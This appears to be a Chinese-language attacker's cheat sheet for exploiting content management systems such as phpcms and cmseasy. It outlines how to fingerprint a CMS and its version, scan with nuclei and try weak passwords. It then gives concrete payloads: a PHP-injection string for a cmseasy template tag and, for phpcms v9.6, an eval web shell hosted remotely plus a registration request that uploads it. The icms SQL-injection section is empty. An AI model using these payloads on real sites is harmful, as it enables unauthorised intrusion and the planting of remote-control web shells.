phpcms：
帝国cms
苹果cms
Drupal
wordpress
discuz
Joomla

同一套系统的不同站点的jwt加密密钥可能相同。

## **流程**
首先是确定CMS
```
logo、标题等等
```
确定CMS版本号
```
通过一些README.md
或特征文件，如xx.xml

工具使用：
目录扫描
nuclei 扫描
nuclei -tag CMS标签 扫描
```
搜索该版本号存在的漏洞，后台地址，日志泄露地址。甚至可以问AI。
如/runtime/log直接列目录，有/runtime/log/201901/03.log
```
部分有先决条件的。
如要求登录，可以尝试弱口令先进入后台。
多个文件上传，部分上传目录无法解析php，换一个上传目录可能就解析php了
```
再尝试更多

^
#### **cmseasy php系统v5.7**
admin/admin
后台模板-自定义标签，使用payload，预览即可。
```
1111";}<?php phpinfo() ?>
```


^
## **phpcms v9.6**
安装路径/install/install.php
存在远程任意文件上传
```
http://xx.xx.xx.xx/1.txt存放内容如下:
<?php @eval($_POST[1]);?>
```
注册抓包改包
```
POST /index.php?m=member&c=index&a=register&siteid=1 HTTP/1.1

siteid=1&modelid=11&username=test452&password=test2123&email=test2154@163.com&info[content]=<img src=http://xx.xx.xx.xx/1.txt?.php#.jpg>&dosubmit=1&protocol=
```
此时会回显上传的路径


^
## **icms**
sql注入
```

```